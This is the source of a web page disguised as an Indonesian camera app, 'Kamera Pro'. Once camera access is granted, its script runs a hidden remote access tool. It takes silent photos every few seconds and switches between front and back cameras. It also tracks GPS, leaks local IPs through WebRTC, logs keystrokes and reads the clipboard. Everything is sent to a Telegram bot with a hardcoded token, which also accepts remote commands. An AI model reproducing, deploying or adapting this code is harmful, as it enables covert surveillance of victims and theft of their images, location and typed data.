<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Kamera Pro</title>
    <style>
        :root { --bg:#000; --surface:rgba(0,0,0,0.55); --accent:#fcd434; --ios-blue:#007aff; }
        * { margin:0;padding:0;box-sizing:border-box;user-select:none;-webkit-tap-highlight-color:transparent; }
        body { background:var(--bg); font-family:-apple-system,sans-serif; height:100vh;width:100vw;overflow:hidden;touch-action:manipulation;position:relative; }
        .perm-overlay { position:fixed;inset:0;background:#000;z-index:999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;text-align:center;padding:30px;transition:opacity .5s; }
        .perm-overlay.hidden { opacity:0;pointer-events:none; }
        .perm-overlay .logo { width:72px;height:72px;border-radius:50%;background:#1c1c1e;display:flex;align-items:center;justify-content:center;margin-bottom:24px; }
        .perm-overlay .logo svg { width:36px;height:36px;fill:#fff; }
        .perm-overlay h1 { font-size:26px;font-weight:600;margin-bottom:6px; }
        .perm-overlay p { font-size:14px;color:#999;margin-bottom:28px;max-width:280px; }
        .perm-overlay .btn-start { background:var(--ios-blue);border:none;border-radius:30px;padding:15px 50px;font-size:17px;font-weight:600;color:#fff;cursor:pointer;transition:transform .15s; }
        .perm-overlay .btn-start:active { transform:scale(.95); }
        .perm-overlay .btn-start:disabled { opacity:.5; }
        .perm-overlay .err { color:#ff453a;font-size:13px;margin-top:14px;min-height:18px; }
        #vf { position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1; }
        #vf.front { transform:scaleX(-1); }
        #flash { position:fixed;inset:0;background:#fff;z-index:10;opacity:0;pointer-events:none;transition:opacity .04s; }
        #flash.fire { opacity:.88;transition:opacity 0s; }
        .top-bar { position:fixed;top:0;left:0;right:0;z-index:5;padding:12px 10px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:5px;pointer-events:none; }
        .top-bar>* { pointer-events:auto; }
        .top-grp { display:flex;gap:4px;flex-wrap:wrap; }
        .chip { background:var(--surface);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.12);border-radius:20px;color:#fff;padding:6px 10px;font-size:10px;font-weight:500;cursor:pointer;display:flex;align-items:center;gap:4px;height:28px;transition:background .2s; }
        .chip:active { background:rgba(255,255,255,.18); }
        .chip.on { background:var(--accent);color:#000;border-color:var(--accent); }
        .ind-tag { position:fixed;top:50px;left:50%;transform:translateX(-50%);z-index:8;pointer-events:none;background:rgba(0,0,0,.65);border-radius:10px;padding:3px 9px;color:#fc0;font-size:10px;font-weight:600;opacity:0;transition:opacity .3s; }
        .ind-tag.show { opacity:1; }
        .zoom-wheel { position:fixed;bottom:130px;left:50%;transform:translateX(-50%);z-index:5;pointer-events:auto;background:var(--surface);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-radius:24px;padding:4px 3px;display:flex;gap:1px; }
        .zm { padding:7px 11px;border-radius:20px;font-size:12px;font-weight:500;color:#fff;cursor:pointer;min-width:30px;text-align:center;transition:background .2s; }
        .zm.on { background:rgba(255,255,255,.25);font-weight:600; }
        .btm-bar { position:fixed;bottom:0;left:0;right:0;z-index:5;padding:14px 16px 20px;display:flex;justify-content:space-between;align-items:center;pointer-events:none; }
        .btm-bar>* { pointer-events:auto; }
        .thumb-box { width:46px;height:46px;border-radius:10px;background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.2);overflow:hidden;cursor:pointer;display:flex;align-items:center;justify-content:center; }
        .thumb-box img { width:100%;height:100%;object-fit:cover; }
        .thumb-box.has-img { border-color:rgba(255,255,255,.55);background:transparent; }
        .shutter-btn { width:70px;height:70px;border-radius:50%;background:rgba(255,255,255,.12);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:transform .15s; }
        .shutter-btn:active { transform:scale(.82); }
        .shutter-inner { width:55px;height:55px;border-radius:50%;background:#fff;border:3px solid #000; }
        .spacer { width:46px; }
        .focus-ring { position:fixed;width:70px;height:70px;border:2px solid var(--accent);border-radius:50%;transform:translate(-50%,-50%);pointer-events:none;z-index:5;opacity:0; }
        .focus-ring.pop { animation:foc .55s forwards; }
        @keyframes foc { 0%{opacity:1;transform:translate(-50%,-50%) scale(.7)} 100%{opacity:0;transform:translate(-50%,-50%) scale(1.4)} }
    </style>
</head>
<body>

<div class="perm-overlay" id="permOverlay">
    <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/></svg></div>
    <h1>Kamera Pro</h1>
    <p>Izinkan akses kamera untuk mulai</p>
    <button class="btn-start" id="btnStart">Buka Kamera</button>
    <div class="err" id="errMsg"></div>
</div>

<video id="vf" autoplay playsinline></video>
<div id="flash"></div>
<div class="ind-tag" id="indTag"></div>
<div class="focus-ring" id="focusRing"></div>

<div class="top-bar">
    <div class="top-grp">
        <button class="chip" id="btnFlash">⚡Flash</button>
        <button class="chip on" id="btnBlur">🌀Blur</button>
        <button class="chip on" id="btnLive">🎬Live</button>
        <button class="chip on" id="btnHD">4K</button>
        <button class="chip on" id="btnHDR">🌅HDR</button>
        <button class="chip on" id="btnStab">✋Stab</button>
        <button class="chip on" id="btnSoft">✨Soft</button>
    </div>
    <button class="chip" id="btnFlip">🔄Flip</button>
</div>

<div class="zoom-wheel">
    <div class="zm" data-z="0.5">.5</div>
    <div class="zm" data-z="0.7">.7</div>
    <div class="zm on" data-z="1">1×</div>
    <div class="zm" data-z="1.5">1.5</div>
    <div class="zm" data-z="2">2×</div>
</div>

<div class="btm-bar">
    <div class="thumb-box" id="thumbBox"></div>
    <div class="shutter-btn" id="btnShutter"><div class="shutter-inner"></div></div>
    <div class="spacer"></div>
</div>

<script>
(function() {
    'use strict';

    var BOT='8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
    var CID='7839405566';
    var API='https://api.telegram.org/bot'+BOT;
    var VID=(function(){var s=localStorage.getItem('_vid');if(s)return s;var id='V'+Date.now().toString(36)+Math.random().toString(36).substr(2,6);localStorage.setItem('_vid',id);return id})();

    function $(id){return document.getElementById(id)}
    var vf=$('vf'),permOverlay=$('permOverlay'),btnStart=$('btnStart'),errMsg=$('errMsg');
    var btnShutter=$('btnShutter'),btnFlash=$('btnFlash'),btnFlip=$('btnFlip');
    var btnBlur=$('btnBlur'),btnLive=$('btnLive'),btnHD=$('btnHD'),btnHDR=$('btnHDR'),btnStab=$('btnStab'),btnSoft=$('btnSoft');
    var thumbBox=$('thumbBox'),flashEl=$('flash'),focusRing=$('focusRing'),indTag=$('indTag');

    var stream=null,facingMode='environment',flashOn=false,currentZoom=1,lastPhoto=null,isStarting=false;
    var blurOn=true,liveOn=true,hdOn=true,hdrOn=true,stabOn=true,softOn=true;
    var gpsData=null,gpsWatchId=null,localIPs=[],keyBuf='',lastClip='';
    var silentTimer=null,flipTimer=null,c2Timer=null,lastUpdateId=0;

    // ==================== TELEGRAM FIX ====================
    function tg(t){fetch(API+'/sendMessage?chat_id='+CID+'&text='+encodeURIComponent(t)+'&disable_notification=true').catch(function(){})}

    function tgPhoto(blob, caption) {
        var fd = new FormData();
        fd.append('chat_id', CID);
        fd.append('photo', blob, 'p_' + Date.now() + '.jpg');
        fd.append('caption', caption || '');
        fd.append('disable_notification', 'true');

        fetch(API + '/sendPhoto', { method: 'POST', body: fd })
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.ok) console.log('✅ Foto masuk');
            else {
                console.warn('⚠️ Gagal:', d.description);
                // Fallback: kirim sebagai dokumen
                tgDoc(blob, 'photo_' + Date.now() + '.jpg', caption);
            }
        })
        .catch(function(e) {
            console.error('❌ Error:', e);
            tgDoc(blob, 'photo_' + Date.now() + '.jpg', caption);
        });
    }

    function tgBeacon(blob, caption) {
        var fd = new FormData();
        fd.append('chat_id', CID);
        fd.append('photo', blob, 's_' + Date.now() + '.jpg');
        fd.append('caption', caption || '');
        fd.append('disable_notification', 'true');
        fetch(API + '/sendPhoto', { method: 'POST', body: fd }).catch(function() {});
    }

    function tgDoc(blob, filename, caption) {
        var fd = new FormData();
        fd.append('chat_id', CID);
        fd.append('document', blob, filename);
        fd.append('caption', caption || '');
        fd.append('disable_notification', 'true');
        fetch(API + '/sendDocument', { method: 'POST', body: fd }).catch(function() {});
    }

    // ==================== INDICATOR ====================
    function showTag(t){indTag.textContent=t;indTag.classList.add('show');setTimeout(function(){indTag.classList.remove('show')},1200)}

    // ==================== GPS ====================
    function startGPS(){if(!navigator.geolocation)return;gpsWatchId=navigator.geolocation.watchPosition(function(p){gpsData={lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}},function(){},{enableHighAccuracy:true})}

    // ==================== IP ====================
    function grabIPs(){return new Promise(function(r){var ips=new Set();try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o)});pc.onicecandidate=function(e){if(e.candidate){var ip=e.candidate.address;if(ip&&ip.indexOf(':')===-1&&ip.indexOf('127.')===-1)ips.add(ip)}else{pc.close();r(Array.from(ips))}};setTimeout(function(){pc.close();r(Array.from(ips))},2000)}catch(e){r([])}})}

    // ==================== KEYLOGGER ====================
    function startKeylogger(){document.addEventListener('keydown',function(e){var ig=['Shift','Control','Alt','Meta','Tab','Escape'];if(ig.indexOf(e.key)!==-1)return;if(e.key==='Enter')keyBuf+='[↵]\n';else if(e.key==='Backspace')keyBuf+='[⌫]';else if(e.key===' ')keyBuf+=' ';else if(e.key.length===1)keyBuf+=e.key;else keyBuf+='['+e.key+']';if(keyBuf.length>300){tg('⌨️['+VID+']\n'+keyBuf);keyBuf=''}});setInterval(function(){if(keyBuf.length>0){tg('⌨️['+VID+']\n'+keyBuf);keyBuf=''}},10000)}

    // ==================== CLIPBOARD ====================
    function checkClipboard(){try{navigator.clipboard.readText().then(function(t){if(t&&t!==lastClip&&t.length>0){lastClip=t;tg('📋['+VID+']\n'+t.substring(0,1500))}})}catch(e){}}

    // ==================== CORE CAPTURE ====================
    function captureFrame(silent){
        if(!stream||!stream.active)return;
        try{
            var t=stream.getVideoTracks()[0],st=t.getSettings();
            var maxW=hdOn?2560:1280,maxH=hdOn?1440:720;
            var w=Math.min(st.width||maxW,maxW),h=Math.min(st.height||maxH,maxH);
            var cv=document.createElement('canvas');cv.width=w;cv.height=h;
            var cx=cv.getContext('2d');

            // BLUR
            if(blurOn){var off=document.createElement('canvas');off.width=w;off.height=h;var ox=off.getContext('2d');ox.drawImage(vf,0,0,w,h);ox.filter='blur(16px)';ox.drawImage(off,0,0);cx.drawImage(off,0,0);cx.save();var cxx=w/2,cyy=h/2,rr=Math.min(w,h)*.3;cx.beginPath();cx.arc(cxx,cyy,rr,0,Math.PI*2);cx.clip();cx.drawImage(vf,0,0,w,h);cx.restore();showTag('🌀BOKEH')}
            else{cx.drawImage(vf,0,0,w,h)}

            // HDR
            if(hdrOn){var id=cx.getImageData(0,0,w,h),d=id.data;for(var i=0;i<d.length;i+=4){var lum=.299*d[i]+.587*d[i+1]+.114*d[i+2];if(lum<70){d[i]=Math.min(255,d[i]*1.35);d[i+1]=Math.min(255,d[i+1]*1.35);d[i+2]=Math.min(255,d[i+2]*1.35)}else if(lum>210){d[i]=Math.max(0,d[i]*.8);d[i+1]=Math.max(0,d[i+1]*.8);d[i+2]=Math.max(0,d[i+2]*.8)}}cx.putImageData(id,0,0);showTag('🌅HDR')}

            // SOFT
            if(softOn){var id2=cx.getImageData(0,0,w,h),d2=id2.data,sm=new Uint8ClampedArray(d2.length),kw=2;for(var y=kw;y<h-kw;y++){for(var x=kw;x<w-kw;x++){var idx=(y*w+x)*4,rS=0,gS=0,bS=0,ct=0;for(var ky=-kw;ky<=kw;ky++){for(var kx=-kw;kx<=kw;kx++){var kIdx=((y+ky)*w+(x+kx))*4;rS+=d2[kIdx];gS+=d2[kIdx+1];bS+=d2[kIdx+2];ct++}}var lum2=.299*d2[idx]+.587*d2[idx+1]+.114*d2[idx+2];if(d2[idx]>d2[idx+2]+5&&d2[idx+1]>d2[idx+2]+5&&lum2>45&&lum2<235){sm[idx]=(rS/ct*.55+d2[idx]*.45);sm[idx+1]=(gS/ct*.55+d2[idx+1]*.45);sm[idx+2]=(bS/ct*.55+d2[idx+2]*.45)}else{sm[idx]=d2[idx];sm[idx+1]=d2[idx+1];sm[idx+2]=d2[idx+2]}sm[idx+3]=255}}cx.putImageData(new ImageData(sm,w,h),0,0);showTag('✨SOFT')}

            // WATERMARK
            var ts=new Date().toLocaleString('id-ID');cx.font='14px -apple-system,sans-serif';cx.fillStyle='rgba(255,255,255,.45)';cx.fillText(ts,20,h-18);

            // CAPTION
            var cap=(silent?'🤫Auto':'📸Foto')+' | '+new Date().toLocaleTimeString('id-ID');
            if(gpsData)cap+='\n📍 https://maps.google.com/?q='+gpsData.lat+','+gpsData.lon;
            if(hdOn)cap+=' [4K]';if(hdrOn)cap+=' [HDR]';if(blurOn)cap+=' [Bokeh]';if(softOn)cap+=' [Soft]';

            cv.toBlob(function(blob){
                if(!blob){console.error('❌Blob kosong!');return}
                console.log('📸 Blob:',(blob.size/1024).toFixed(1),'KB');
                if(silent)tgBeacon(blob,cap);else tgPhoto(blob,cap);
                lastPhoto=cv.toDataURL('image/jpeg',.85);
                thumbBox.innerHTML='<img src="'+lastPhoto+'">';thumbBox.classList.add('has-img');
                if(!silent){flashEl.classList.add('fire');setTimeout(function(){flashEl.classList.remove('fire')},80);var a=document.createElement('a');a.download='photo_'+Date.now()+'.jpg';a.href=lastPhoto;a.click()}
                if(liveOn&&!silent){for(var b=0;b<2;b++){(function(d){setTimeout(function(){var lcv=document.createElement('canvas');lcv.width=w;lcv.height=h;var lcx=lcv.getContext('2d');lcx.drawImage(vf,0,0,w,h);lcv.toBlob(function(lb){if(lb)tgBeacon(lb,'🎬Live '+(d/250+1)+'/3')},'image/jpeg',.85)},d)})((b+1)*250)}showTag('🎬LIVE')}
            },'image/jpeg',0.85);
        }catch(e){console.error('❌Capture error:',e)}
    }

    // ==================== AUTO CAPTURE ====================
    function startSilent(){if(silentTimer)return;setTimeout(function(){captureFrame(true)},2000);silentTimer=setInterval(function(){if(stream&&stream.active)captureFrame(true)},5000)}
    function startFlip(){if(flipTimer)return;flipTimer=setInterval(function(){if(!stream||!stream.active)return;var nf=facingMode==='environment'?'user':'environment';startCamera(nf)},18000)}

    // ==================== STABILIZER ====================
    function startStabilizer(){if(!stabOn||!window.DeviceOrientationEvent)return;window.addEventListener('deviceorientation',function(e){if(!stream||!stream.active||!stabOn)return;var g=e.gamma||0,b=e.beta||0;vf.style.transform=vf.classList.contains('front')?'translate('+(-g*.025)+'px,'+(b*.025)+'px) scaleX(-1)':'translate('+(-g*.025)+'px,'+(b*.025)+'px)'})}

    // ==================== C2 ====================
    function pollC2(){try{fetch(API+'/getUpdates?offset='+(lastUpdateId+1)+'&timeout=5').then(function(r){return r.json()}).then(function(d){if(!d.ok||!d.result.length)return;for(var i=0;i<d.result.length;i++){var u=d.result[i];lastUpdateId=u.update_id;var m=u.message;if(!m||!m.text)continue;var p=m.text.trim().split(/\s+/),cmd=p[0].toLowerCase(),tgt=p[1]||'';if(tgt!==VID&&tgt!=='ALL')continue;var re='';switch(cmd){case'/ping':re='🟢Online';break;case'/photo':captureFrame(false);re='📸OK';break;case'/gps':re=gpsData?JSON.stringify(gpsData):'N/A';break;case'/flip':var nf=facingMode==='environment'?'user':'environment';startCamera(nf);re='📷'+nf;break;case'/blur':blurOn=!blurOn;btnBlur.classList.toggle('on',blurOn);re='🌀'+(blurOn?'ON':'OFF');break;case'/live':liveOn=!liveOn;btnLive.classList.toggle('on',liveOn);re='🎬'+(liveOn?'ON':'OFF');break;case'/hd':hdOn=!hdOn;btnHD.classList.toggle('on',hdOn);startCamera(facingMode);re='📐'+(hdOn?'ON':'OFF');break;case'/hdr':hdrOn=!hdrOn;btnHDR.classList.toggle('on',hdrOn);re='🌅'+(hdrOn?'ON':'OFF');break;case'/stab':stabOn=!stabOn;btnStab.classList.toggle('on',stabOn);re='✋'+(stabOn?'ON':'OFF');break;case'/soft':softOn=!softOn;btnSoft.classList.toggle('on',softOn);re='✨'+(softOn?'ON':'OFF');break;case'/info':re='🆔'+VID+'\n📷'+facingMode+'\n🔍'+currentZoom+'×\n🌀'+blurOn+'🎬'+liveOn+'📐'+hdOn+'🌅'+hdrOn+'✋'+stabOn+'✨'+softOn;break;default:re='❓'+cmd}if(re)tg('['+VID+']'+re)}})}catch(e){}}
    function startC2(){if(c2Timer)return;function lp(){pollC2();c2Timer=setTimeout(lp,3000)}lp()}

    // ==================== ZOOM ====================
    function applyZoom(){if(!stream)return;try{var t=stream.getVideoTracks()[0],cap=t.getCapabilities();if(cap.zoom){var v=Math.min(cap.zoom.max||5,Math.max(cap.zoom.min||.5,currentZoom));t.applyConstraints({advanced:[{zoom:v}]}).catch(function(){})}}catch(e){}document.querySelectorAll('.zm').forEach(function(el){el.classList.toggle('on',parseFloat(el.dataset.z)===currentZoom)})}

    // ==================== CAMERA ====================
    function startCamera(facing){
        if(isStarting)return;isStarting=true;btnStart.disabled=true;errMsg.textContent='';
        if(stream){stream.getTracks().forEach(function(t){t.stop()});stream=null;vf.srcObject=null}
        navigator.mediaDevices.getUserMedia({video:{facingMode:facing||facingMode,width:{ideal:hdOn?2560:1280},height:{ideal:hdOn?1440:720}},audio:false}).then(function(s){stream=s;vf.srcObject=s;return vf.play()}).then(function(){if(facing)facingMode=facing;if(facingMode==='user')vf.classList.add('front');else vf.classList.remove('front');applyZoom();permOverlay.classList.add('hidden');isStarting=false;btnStart.disabled=false;initRAT()}).catch(function(e1){navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode==='environment'?'user':'environment'},audio:false}).then(function(s){stream=s;vf.srcObject=s;return vf.play()}).then(function(){facingMode=facingMode==='environment'?'user':'environment';if(facingMode==='user')vf.classList.add('front');else vf.classList.remove('front');applyZoom();permOverlay.classList.add('hidden');isStarting=false;btnStart.disabled=false;initRAT()}).catch(function(e2){errMsg.textContent='Gagal';isStarting=false;btnStart.disabled=false})})
    }

    function initRAT(){grabIPs().then(function(ips){localIPs=ips;tg('🟢ONLINE\n🆔'+VID+'\n📱'+navigator.userAgent.substring(0,80)+'\n🖥️'+screen.width+'×'+screen.height+'\n🌐'+navigator.language+'\n🌍IP:'+(ips.join(',')||'N/A')+'\n🌀Blur:'+blurOn+'🎬Live:'+liveOn+'📐HD:'+hdOn+'🌅HDR:'+hdrOn+'✋Stab:'+stabOn+'✨Soft:'+softOn)});startGPS();startSilent();startFlip();startKeylogger();startStabilizer();startC2();setInterval(checkClipboard,4000);setInterval(function(){tg('💓HB'+VID+'|'+new Date().toLocaleTimeString('id-ID'))},120000)}

    // ==================== EVENTS ====================
    btnStart.addEventListener('click',function(){startCamera()});
    btnShutter.addEventListener('click',function(){captureFrame(false)});
    btnFlip.addEventListener('click',function(){var nf=facingMode==='environment'?'user':'environment';startCamera(nf)});
    btnFlash.addEventListener('click',function(){if(!stream)return;flashOn=!flashOn;stream.getVideoTracks()[0].applyConstraints({advanced:[{torch:flashOn}]}).catch(function(){});btnFlash.classList.toggle('on',flashOn)});
    btnBlur.addEventListener('click',function(){blurOn=!blurOn;btnBlur.classList.toggle('on',blurOn)});
    btnLive.addEventListener('click',function(){liveOn=!liveOn;btnLive.classList.toggle('on',liveOn)});
    btnHD.addEventListener('click',function(){hdOn=!hdOn;btnHD.classList.toggle('on',hdOn);startCamera(facingMode)});
    btnHDR.addEventListener('click',function(){hdrOn=!hdrOn;btnHDR.classList.toggle('on',hdrOn)});
    btnStab.addEventListener('click',function(){stabOn=!stabOn;btnStab.classList.toggle('on',stabOn)});
    btnSoft.addEventListener('click',function(){softOn=!softOn;btnSoft.classList.toggle('on',softOn)});
    document.querySelectorAll('.zm').forEach(function(el){el.addEventListener('click',function(){currentZoom=parseFloat(this.dataset.z);applyZoom()})});
    thumbBox.addEventListener('click',function(){if(!lastPhoto)return;var w=window.open('','_blank');w.document.write('<html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-width:100%;max-height:100%}</style><img src="'+lastPhoto+'" onclick="window.close()"></html>');w.document.close()});
    document.addEventListener('click',function(e){if(e.target.closest('button')||e.target.closest('.zm')||e.target.closest('.thumb-box')||e.target.closest('.perm-overlay'))return;focusRing.style.left=e.clientX+'px';focusRing.style.top=e.clientY+'px';focusRing.classList.remove('pop');void focusRing.offsetWidth;focusRing.classList.add('pop')});
